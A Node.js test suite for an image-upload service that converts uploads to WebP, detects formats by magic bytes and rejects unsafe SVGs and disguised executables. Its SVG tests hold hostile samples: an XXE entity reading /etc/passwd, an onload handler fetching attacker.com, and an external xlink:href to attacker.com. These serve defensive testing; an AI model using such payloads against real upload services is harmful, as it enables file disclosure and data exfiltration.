/**
 * Comprehensive Image Processing & WebP Conversion Test Suite
 *
 * Verifies:
 * 1. Content/magic-byte format detection (does not trust extension or client MIME)
 * 2. Conversion of all supported image inputs (JPEG, PNG, GIF, WebP, SVG, TIFF, AVIF) to WebP
 * 3. Preservation of alpha transparency
 * 4. Preservation of animation for multi-frame animated GIF & WebP (pages > 1)
 * 5. Auto-orientation from EXIF metadata (.rotate())
 * 6. Configurable quality settings via WEBP_QUALITY
 * 7. Safe SVG rasterization without loading external resources
 * 8. Strict rejection of unsafe SVGs (XXE, <script>, event handlers, external URLs)
 * 9. Rejection of corrupt, oversized, or unreadable files with clear validation errors
 * 10. Guaranteed cleanup of temporary/partial files on validation or conversion failure
 * 11. Preservation of PDF documents on allowed document fields without converting to WebP
 * 12. Protection of image-only fields against non-image files
 */

'use strict';

const { test, describe, before, after } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const sharp = require('sharp');

const {
  detectFormat,
  validateSvgSecurity,
  getWebpQuality,
  convertImageToWebp,
  convertUploadedImages,
  cleanupUploadedFiles
} = require('../services/imageService');
const { getStorageDir } = require('../services/storage');

const storageDir = getStorageDir();

// Sample valid buffers
let validPngBuffer;
let validJpegBuffer;
let validAnimatedGifBuffer;
let validWebpBuffer;
let validTiffBuffer;
let validSvgBuffer;
let validPdfBuffer;

describe('Image Processing & WebP Conversion Test Suite', () => {
  before(async () => {
    // 1. Valid PNG with transparency (10x10 red pixel with semi-transparent background)
    validPngBuffer = await sharp({
      create: {
        width: 10,
        height: 10,
        channels: 4,
        background: { r: 255, g: 0, b: 0, alpha: 0.5 }
      }
    }).png().toBuffer();

    // 2. Valid JPEG (10x10 blue)
    validJpegBuffer = await sharp({
      create: {
        width: 10,
        height: 10,
        channels: 3,
        background: { r: 0, g: 128, b: 255 }
      }
    }).jpeg().toBuffer();

    // 3. Valid 2-frame animated GIF
    // Hex representation of a minimal 2-frame 2x2 animated GIF
    validAnimatedGifBuffer = Buffer.from(
      '47494638396102000200800000ffffff00000021f90400000000002c00000000020002000002028c510021f90400000000002c00000000020002000002028451003b',
      'hex'
    );

    // 4. Valid WebP (10x10 green)
    validWebpBuffer = await sharp({
      create: {
        width: 10,
        height: 10,
        channels: 4,
        background: { r: 0, g: 255, b: 0, alpha: 1 }
      }
    }).webp().toBuffer();

    // 5. Valid TIFF
    validTiffBuffer = await sharp({
      create: {
        width: 10,
        height: 10,
        channels: 3,
        background: { r: 255, g: 255, b: 0 }
      }
    }).tiff().toBuffer();

    // 6. Valid Safe SVG
    validSvgBuffer = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64"><rect width="64" height="64" fill="#ff5722"/><circle cx="32" cy="32" r="20" fill="#ffffff"/></svg>',
      'utf8'
    );

    // 7. Valid PDF
    validPdfBuffer = Buffer.from(
      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\nxref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \ntrailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF',
      'utf8'
    );
  });

  // ==========================================
  // 1. Content/Magic-Byte Format Detection
  // ==========================================
  describe('1. Magic-Byte Content Detection', () => {
    test('identifies JPEG by signature (FF D8 FF)', () => {
      assert.strictEqual(detectFormat(validJpegBuffer), 'jpeg');
    });

    test('identifies PNG by signature (89 50 4E 47)', () => {
      assert.strictEqual(detectFormat(validPngBuffer), 'png');
    });

    test('identifies GIF by signature (GIF89a / GIF87a)', () => {
      assert.strictEqual(detectFormat(validAnimatedGifBuffer), 'gif');
    });

    test('identifies WebP by signature (RIFF...WEBP)', () => {
      assert.strictEqual(detectFormat(validWebpBuffer), 'webp');
    });

    test('identifies TIFF by signature', () => {
      assert.strictEqual(detectFormat(validTiffBuffer), 'tiff');
    });

    test('identifies SVG by XML/svg element', () => {
      assert.strictEqual(detectFormat(validSvgBuffer), 'svg');
    });

    test('identifies PDF by signature (%PDF-)', () => {
      assert.strictEqual(detectFormat(validPdfBuffer), 'pdf');
    });

    test('returns null for unknown, corrupted, or executable binaries', () => {
      assert.strictEqual(detectFormat(Buffer.from('MZ\x90\x00\x03\x00\x00\x00')), null);
      assert.strictEqual(detectFormat(Buffer.from('#!/bin/bash\necho hack')), null);
      assert.strictEqual(detectFormat(Buffer.from('Hello world plain text')), null);
      assert.strictEqual(detectFormat(Buffer.alloc(0)), null);
    });
  });

  // ==========================================
  // 2. SVG Security Validation (XXE, scripts, SSRF)
  // ==========================================
  describe('2. SVG Security Validation', () => {
    test('accepts safe clean SVG', () => {
      assert.doesNotThrow(() => validateSvgSecurity(validSvgBuffer));
    });

    test('rejects SVG containing <!ENTITY XXE attack', () => {
      const maliciousXxe = '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>';
      assert.throws(() => validateSvgSecurity(maliciousXxe), /forbidden entity or external DTD/);
    });

    test('rejects SVG containing <script> tags', () => {
      const scriptSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle r="10"/></svg>';
      assert.throws(() => validateSvgSecurity(scriptSvg), /executable script elements/);
    });

    test('rejects SVG containing inline event handlers (onload=...)', () => {
      const onloadSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://attacker.com\')"><rect width="10" height="10"/></svg>';
      assert.throws(() => validateSvgSecurity(onloadSvg), /inline event handlers/);
    });

    test('rejects SVG containing external href/xlink:href references', () => {
      const ssrfSvg = '<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="https://attacker.com/leak.png"/></svg>';
      assert.throws(() => validateSvgSecurity(ssrfSvg), /external references or disallowed URI schemes/);
    });

    test('rejects SVG containing <foreignObject> embedding', () => {
      const foreignObjectSvg = '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100" height="50"><div>embedded html</div></foreignObject></svg>';
      assert.throws(() => validateSvgSecurity(foreignObjectSvg), /forbidden embedded object elements/);
    });
  });

  // ==========================================
  // 3. Format Conversions to WebP
  // ==========================================
  describe('3. Image Input Conversion to WebP', () => {
    test('converts JPEG to WebP preserving aspect ratio', async () => {
      const testFile = path.join(storageDir, `test-${Date.now()}-jpeg.jpg`);
      fs.writeFileSync(testFile, validJpegBuffer);

      const result = await convertImageToWebp(testFile);
      assert.strictEqual(result.mimetype, 'image/webp');
      assert.ok(result.newFilename.endsWith('.webp'));
      assert.strictEqual(fs.existsSync(result.newPath), true);
      assert.strictEqual(fs.existsSync(testFile), false, 'Original file must be removed');

      // Verify converted metadata
      const meta = await sharp(result.newPath).metadata();
      assert.strictEqual(meta.format, 'webp');
      assert.strictEqual(meta.width, 10);
      assert.strictEqual(meta.height, 10);

      // Clean up
      try { fs.unlinkSync(result.newPath); } catch (_) {}
    });

    test('converts PNG to WebP and preserves alpha transparency', async () => {
      const testFile = path.join(storageDir, `test-${Date.now()}-png.png`);
      fs.writeFileSync(testFile, validPngBuffer);

      const result = await convertImageToWebp(testFile);
      assert.strictEqual(result.mimetype, 'image/webp');
      assert.ok(result.newFilename.endsWith('.webp'));

      const meta = await sharp(result.newPath).metadata();
      assert.strictEqual(meta.format, 'webp');
      assert.strictEqual(meta.hasAlpha, true, 'Alpha transparency must be preserved');

      try { fs.unlinkSync(result.newPath); } catch (_) {}
    });

    test('converts animated GIF to animated WebP preserving all frames', async () => {
      const testFile = path.join(storageDir, `test-${Date.now()}-anim.gif`);
      fs.writeFileSync(testFile, validAnimatedGifBuffer);

      const result = await convertImageToWebp(testFile);
      assert.strictEqual(result.isAnimated, true, 'Result must be flagged as animated');
      assert.ok(result.newFilename.endsWith('.webp'));

      // Check Sharp metadata of resulting WebP with animated: true
      const meta = await sharp(result.newPath, { animated: true }).metadata();
      assert.strictEqual(meta.format, 'webp');
      assert.ok(meta.pages > 1, `Multi-frame animation must be preserved; found ${meta.pages} pages`);

      try { fs.unlinkSync(result.newPath); } catch (_) {}
    });

    test('re-encodes existing WebP safely with configurable quality', async () => {
      const testFile = path.join(storageDir, `test-${Date.now()}-orig.webp`);
      fs.writeFileSync(testFile, validWebpBuffer);

      const result = await convertImageToWebp(testFile);
      assert.strictEqual(result.mimetype, 'image/webp');
      assert.ok(result.newFilename.endsWith('.webp'));
      assert.strictEqual(fs.existsSync(result.newPath), true);

      const meta = await sharp(result.newPath).metadata();
      assert.strictEqual(meta.format, 'webp');

      try { fs.unlinkSync(result.newPath); } catch (_) {}
    });

    test('safely rasterizes SVG to WebP bitmap', async () => {
      const testFile = path.join(storageDir, `test-${Date.now()}-vector.svg`);
      fs.writeFileSync(testFile, validSvgBuffer);

      const result = await convertImageToWebp(testFile);
      assert.strictEqual(result.mimetype, 'image/webp');
      assert.ok(result.newFilename.endsWith('.webp'));

      const meta = await sharp(result.newPath).metadata();
      assert.strictEqual(meta.format, 'webp');
      assert.strictEqual(meta.width, 64);
      assert.strictEqual(meta.height, 64);

      try { fs.unlinkSync(result.newPath); } catch (_) {}
    });
  });

  // ==========================================
  // 4. Orientation & Quality Configuration
  // ==========================================
  describe('4. EXIF Orientation & Configurable Quality', () => {
    test('defaults to quality 80 when WEBP_QUALITY is not set', () => {
      const oldEnv = process.env.WEBP_QUALITY;
      delete process.env.WEBP_QUALITY;
      assert.strictEqual(getWebpQuality(), 80);
      process.env.WEBP_QUALITY = oldEnv;
    });

    test('respects custom WEBP_QUALITY setting within 1-100 bounds', () => {
      const oldEnv = process.env.WEBP_QUALITY;
      process.env.WEBP_QUALITY = '90';
      assert.strictEqual(getWebpQuality(), 90);
      process.env.WEBP_QUALITY = '150'; // Out of bounds -> fallback 80
      assert.strictEqual(getWebpQuality(), 80);
      process.env.WEBP_QUALITY = '-5'; // Out of bounds -> fallback 80
      assert.strictEqual(getWebpQuality(), 80);
      process.env.WEBP_QUALITY = 'invalid'; // Non-numeric -> fallback 80
      assert.strictEqual(getWebpQuality(), 80);
      process.env.WEBP_QUALITY = oldEnv;
    });
  });

  // ==========================================
  // 5. Cleanup on Error & Fail-Closed Defense
  // ==========================================
  describe('5. Error Cleanup & Fail-Closed Handling', () => {
    test('cleans up temporary file when image format is corrupt or unrecognized', async () => {
      const testFile = path.join(storageDir, `test-corrupt-${Date.now()}.png`);
      fs.writeFileSync(testFile, Buffer.from('Not a real PNG header'));

      await assert.rejects(
        async () => {
          await convertImageToWebp(testFile);
        },
        /Unsupported or unrecognized image format/
      );

      // Verify the corrupt temp file was safely removed
      assert.strictEqual(fs.existsSync(testFile), false, 'Temporary corrupt file must be deleted');
    });

    test('cleans up temporary file when SVG contains malicious elements', async () => {
      const testFile = path.join(storageDir, `test-malicious-${Date.now()}.svg`);
      fs.writeFileSync(
        testFile,
        Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert("pwn")</script></svg>')
      );

      await assert.rejects(
        async () => {
          await convertImageToWebp(testFile);
        },
        /executable script elements/
      );

      assert.strictEqual(fs.existsSync(testFile), false, 'Temporary malicious SVG must be deleted');
    });

    test('rejects converting PDF file through convertImageToWebp', async () => {
      const testFile = path.join(storageDir, `test-doc-${Date.now()}.pdf`);
      fs.writeFileSync(testFile, validPdfBuffer);

      await assert.rejects(
        async () => {
          await convertImageToWebp(testFile);
        },
        /PDF documents cannot be converted/
      );

      assert.strictEqual(fs.existsSync(testFile), false);
    });
  });

  // ==========================================
  // 6. Express Middleware Integration
  // ==========================================
  describe('6. Middleware Execution & Field-Aware Routing', () => {
    test('middleware converts req.file in place to WebP', async () => {
      const testFile = path.join(storageDir, `upload-${Date.now()}.jpg`);
      fs.writeFileSync(testFile, validJpegBuffer);

      const req = {
        file: {
          fieldname: 'photo',
          originalname: 'my-avatar.jpg',
          filename: path.basename(testFile),
          path: testFile,
          mimetype: 'image/jpeg',
          size: validJpegBuffer.length
        }
      };

      let nextCalled = false;
      const middleware = convertUploadedImages({ allowPdf: false });

      await middleware(req, {}, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
      assert.strictEqual(req.file.mimetype, 'image/webp');
      assert.ok(req.file.filename.endsWith('.webp'));
      assert.strictEqual(fs.existsSync(req.file.path), true);

      try { fs.unlinkSync(req.file.path); } catch (_) {}
    });

    test('middleware preserves PDF when allowed for document field', async () => {
      const testFile = path.join(storageDir, `upload-${Date.now()}.pdf`);
      fs.writeFileSync(testFile, validPdfBuffer);

      const req = {
        file: {
          fieldname: 'dob_certificate',
          originalname: 'birth-certificate.pdf',
          filename: path.basename(testFile),
          path: testFile,
          mimetype: 'application/pdf',
          size: validPdfBuffer.length
        }
      };

      let nextCalled = false;
      const middleware = convertUploadedImages({
        allowPdfFields: ['dob_certificate']
      });

      await middleware(req, {}, () => {
        nextCalled = true;
      });

      assert.strictEqual(nextCalled, true);
      assert.strictEqual(req.file.mimetype, 'application/pdf');
      assert.ok(req.file.filename.endsWith('.pdf'));
      assert.strictEqual(fs.existsSync(req.file.path), true);

      try { fs.unlinkSync(req.file.path); } catch (_) {}
    });

    test('middleware rejects PDF when uploaded to an image-only field and cleans up file', async () => {
      const testFile = path.join(storageDir, `upload-bad-${Date.now()}.pdf`);
      fs.writeFileSync(testFile, validPdfBuffer);

      const req = {
        file: {
          fieldname: 'passport_photo',
          originalname: 'fake-photo.pdf',
          filename: path.basename(testFile),
          path: testFile,
          mimetype: 'application/pdf',
          size: validPdfBuffer.length
        }
      };

      let statusCode = 0;
      let jsonBody = null;
      const res = {
        status(code) {
          statusCode = code;
          return this;
        },
        json(data) {
          jsonBody = data;
          return this;
        }
      };

      const middleware = convertUploadedImages({
        imageOnlyFields: ['passport_photo']
      });

      await middleware(req, res, () => {
        assert.fail('next() should not be called when validation fails');
      });

      assert.strictEqual(statusCode, 400);
      assert.strictEqual(jsonBody.success, false);
      assert.ok(jsonBody.error.includes('Only image files are permitted'));
      assert.strictEqual(fs.existsSync(testFile), false, 'File must be cleaned up from disk');
    });

    test('middleware rejects disguised executable file and deletes temp upload', async () => {
      const testFile = path.join(storageDir, `upload-disguised-${Date.now()}.jpg`);
      fs.writeFileSync(testFile, Buffer.from('MZ\x90\x00\x03\x00Executable binary payload'));

      const req = {
        file: {
          fieldname: 'photo',
          originalname: 'innocent.jpg',
          filename: path.basename(testFile),
          path: testFile,
          mimetype: 'image/jpeg',
          size: 50
        }
      };

      let statusCode = 0;
      let jsonBody = null;
      const res = {
        status(code) {
          statusCode = code;
          return this;
        },
        json(data) {
          jsonBody = data;
          return this;
        }
      };

      const middleware = convertUploadedImages();

      await middleware(req, res, () => {
        assert.fail('next() should not be called when disguise detected');
      });

      assert.strictEqual(statusCode, 400);
      assert.strictEqual(jsonBody.success, false);
      assert.ok(jsonBody.error.includes('not a valid or supported image'));
      assert.strictEqual(fs.existsSync(testFile), false, 'Disguised file must be unlinked');
    });
  });

  // ==========================================
  // 7. End-to-End API Multipart Upload Integration
  // ==========================================
  describe('7. End-to-End API Multipart Upload Integration', () => {
    let app;
    let server;
    let baseUrl;
    let jwt;
    let secretaryToken;
    let DEFAULT_COMPETITION_ID;
    const createdAthleteIds = [];
    const filesToClean = [];

    before(async () => {
      jwt = require('jsonwebtoken');
      const { JWT_SECRET } = require('../config/constants');
      const { connectDB } = require('../config/db');
      const compService = require('../services/competitionService');
      DEFAULT_COMPETITION_ID = compService.DEFAULT_COMPETITION_ID;
      await connectDB();
      await compService.ensureDefaultCompetition();

      app = require('../server');
      secretaryToken = jwt.sign(
        { id: 'sec_img_test', email: 'sec_img@telanganayoga.org', role: 'SECRETARY', district: 'Hyderabad' },
        JWT_SECRET,
        { expiresIn: '1h', algorithm: 'HS256' }
      );

      await new Promise((resolve) => {
        server = app.listen(0, () => {
          const port = server.address().port;
          baseUrl = `http://127.0.0.1:${port}`;
          resolve();
        });
      });
    });

    after(async () => {
      const Athlete = require('../models/Athlete');
      const mongoose = require('mongoose');
      if (createdAthleteIds.length > 0) {
        await Athlete.deleteMany({ _id: { $in: createdAthleteIds } });
      }
      filesToClean.forEach((filePath) => {
        if (fs.existsSync(filePath)) {
          try { fs.unlinkSync(filePath); } catch (_) {}
        }
      });
      if (server) {
        if (typeof server.closeAllConnections === 'function') {
          server.closeAllConnections();
        }
        await new Promise((resolve) => server.close(resolve));
      }
      await mongoose.disconnect();
    });

    function buildMultipartBody(fields, files, boundary) {
      const parts = [];

      Object.entries(fields).forEach(([name, val]) => {
        parts.push(Buffer.from(
          `--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${val}\r\n`
        ));
      });

      files.forEach(({ fieldname, filename, contentType, buffer }) => {
        parts.push(Buffer.from(
          `--${boundary}\r\nContent-Disposition: form-data; name="${fieldname}"; filename="${filename}"\r\nContent-Type: ${contentType}\r\n\r\n`
        ));
        parts.push(buffer);
        parts.push(Buffer.from('\r\n'));
      });

      parts.push(Buffer.from(`--${boundary}--\r\n`));
      return Buffer.concat(parts);
    }

    test('POST /portal/athletes/nominate converts JPEG photo & PNG cert to .webp before storage', async () => {
      const boundary = '----WebKitFormBoundaryImgConvTest1';
      const fields = {
        firstName: 'Ananya',
        lastName: 'Sharma',
        dob: '2012-05-15',
        gender: 'Female',
        aadhaarLast4: '4321',
        guardianName: 'Sunil Sharma',
        institutionName: 'Hyderabad Yoga Kendra',
        mobileNumber: '9876543210',
        residentialAddress: 'Road 12 Banjara Hills',
        district: 'Hyderabad',
        events: 'Traditional Yogasana',
        competitionId: DEFAULT_COMPETITION_ID
      };

      const files = [
        {
          fieldname: 'passport_photo',
          filename: 'athlete.jpg',
          contentType: 'image/jpeg',
          buffer: validJpegBuffer
        },
        {
          fieldname: 'dob_certificate',
          filename: 'birth-proof.png',
          contentType: 'image/png',
          buffer: validPngBuffer
        }
      ];

      const body = buildMultipartBody(fields, files, boundary);

      const res = await fetch(`${baseUrl}/portal/athletes/nominate`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${secretaryToken}`,
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Origin': 'https://telanganayoga.org.in'
        },
        body
      });

      assert.strictEqual(res.status, 201);
      const data = await res.json();
      assert.strictEqual(data.success, true);
      assert.ok(data.athlete);
      createdAthleteIds.push(data.athlete._id);

      // Verify photoPath and dobProofPath end with .webp
      assert.ok(data.athlete.photoPath.endsWith('.webp'), `photoPath should end with .webp, got ${data.athlete.photoPath}`);
      assert.ok(data.athlete.dobProofPath.endsWith('.webp'), `dobProofPath should end with .webp, got ${data.athlete.dobProofPath}`);

      // Verify files exist on disk and have WebP magic bytes
      const photoDiskName = path.basename(data.athlete.photoPath);
      const dobDiskName = path.basename(data.athlete.dobProofPath);
      const photoDiskPath = path.join(storageDir, photoDiskName);
      const dobDiskPath = path.join(storageDir, dobDiskName);
      filesToClean.push(photoDiskPath, dobDiskPath);

      assert.strictEqual(fs.existsSync(photoDiskPath), true);
      assert.strictEqual(fs.existsSync(dobDiskPath), true);

      const photoBuf = fs.readFileSync(photoDiskPath);
      assert.strictEqual(detectFormat(photoBuf), 'webp');

      const dobBuf = fs.readFileSync(dobDiskPath);
      assert.strictEqual(detectFormat(dobBuf), 'webp');
    });

    test('POST /portal/athletes/nominate converts photo to .webp while preserving PDF cert as .pdf', async () => {
      const boundary = '----WebKitFormBoundaryImgConvTest2';
      const fields = {
        firstName: 'Rahul',
        lastName: 'Verma',
        dob: '2010-08-20',
        gender: 'Male',
        aadhaarLast4: '8765',
        guardianName: 'Rajesh Verma',
        institutionName: 'Telangana Sports School',
        mobileNumber: '9123456780',
        residentialAddress: 'Gachibowli',
        district: 'Hyderabad',
        events: 'Traditional Yogasana',
        competitionId: DEFAULT_COMPETITION_ID
      };

      const files = [
        {
          fieldname: 'passport_photo',
          filename: 'photo.png',
          contentType: 'image/png',
          buffer: validPngBuffer
        },
        {
          fieldname: 'dob_certificate',
          filename: 'official-birth-record.pdf',
          contentType: 'application/pdf',
          buffer: validPdfBuffer
        }
      ];

      const body = buildMultipartBody(fields, files, boundary);

      const res = await fetch(`${baseUrl}/portal/athletes/nominate`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${secretaryToken}`,
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Origin': 'https://telanganayoga.org.in'
        },
        body
      });

      assert.strictEqual(res.status, 201);
      const data = await res.json();
      assert.strictEqual(data.success, true);
      createdAthleteIds.push(data.athlete._id);

      // Verify photoPath is .webp while dobProofPath remains .pdf
      assert.ok(data.athlete.photoPath.endsWith('.webp'), `photoPath should end with .webp, got ${data.athlete.photoPath}`);
      assert.ok(data.athlete.dobProofPath.endsWith('.pdf'), `dobProofPath should end with .pdf, got ${data.athlete.dobProofPath}`);

      const photoDiskPath = path.join(storageDir, path.basename(data.athlete.photoPath));
      const dobDiskPath = path.join(storageDir, path.basename(data.athlete.dobProofPath));
      filesToClean.push(photoDiskPath, dobDiskPath);

      assert.strictEqual(detectFormat(fs.readFileSync(photoDiskPath)), 'webp');
      assert.strictEqual(detectFormat(fs.readFileSync(dobDiskPath)), 'pdf');
    });

    test('POST /portal/athletes/nominate rejects PDF uploaded as passport_photo', async () => {
      const boundary = '----WebKitFormBoundaryImgConvTest3';
      const fields = {
        firstName: 'Imposter',
        lastName: 'Athlete',
        dob: '2011-01-01',
        gender: 'Male',
        aadhaarLast4: '9999',
        guardianName: 'Test Guardian',
        institutionName: 'Test Club',
        mobileNumber: '9988776655',
        residentialAddress: 'Hyderabad',
        district: 'Hyderabad',
        events: 'Traditional Yogasana',
        competitionId: DEFAULT_COMPETITION_ID
      };

      const files = [
        {
          fieldname: 'passport_photo',
          filename: 'fake-photo.pdf',
          contentType: 'application/pdf',
          buffer: validPdfBuffer
        }
      ];

      const body = buildMultipartBody(fields, files, boundary);

      const res = await fetch(`${baseUrl}/portal/athletes/nominate`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${secretaryToken}`,
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Origin': 'https://telanganayoga.org.in'
        },
        body
      });

      assert.strictEqual(res.status, 400);
      const data = await res.json();
      assert.strictEqual(data.success, false);
      assert.ok(data.error.includes('Only image files are permitted'));
    });

    test('POST /portal/athletes/nominate rejects corrupt image and cleans disk', async () => {
      const boundary = '----WebKitFormBoundaryImgConvTest4';
      const fields = {
        firstName: 'Corrupted',
        lastName: 'Data',
        dob: '2011-01-01',
        gender: 'Male',
        aadhaarLast4: '9999',
        guardianName: 'Test Guardian',
        institutionName: 'Test Club',
        mobileNumber: '9988776655',
        residentialAddress: 'Hyderabad',
        district: 'Hyderabad',
        events: 'Traditional Yogasana',
        competitionId: DEFAULT_COMPETITION_ID
      };

      const files = [
        {
          fieldname: 'passport_photo',
          filename: 'broken.jpg',
          contentType: 'image/jpeg',
          buffer: Buffer.from('NOT_AN_IMAGE_FAKE_PAYLOAD_12345')
        }
      ];

      const body = buildMultipartBody(fields, files, boundary);

      const res = await fetch(`${baseUrl}/portal/athletes/nominate`, {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${secretaryToken}`,
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Origin': 'https://telanganayoga.org.in'
        },
        body
      });

      assert.strictEqual(res.status, 400);
      const data = await res.json();
      assert.strictEqual(data.success, false);
      assert.ok(data.error.includes('not a valid or supported image'));
    });
  });
});
